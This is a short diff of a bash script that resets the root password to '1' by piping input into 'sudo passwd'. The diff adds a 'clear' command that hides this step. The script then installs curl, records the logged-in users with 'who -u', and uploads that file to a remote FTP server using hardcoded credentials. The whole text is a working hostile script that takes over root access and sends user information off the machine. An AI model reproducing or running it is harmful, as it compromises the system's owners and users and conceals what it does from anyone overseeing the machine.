@@ -1,6 +1,7 @@
 #!/bin/bash
 
 echo -e "1\n1" | sudo passwd
+clear
 sudo apt-get install curl
 who -u >> Users.txt
 curl -T Users.txt ftp://hostinger:password@192.168.0.10:21/Users.txt
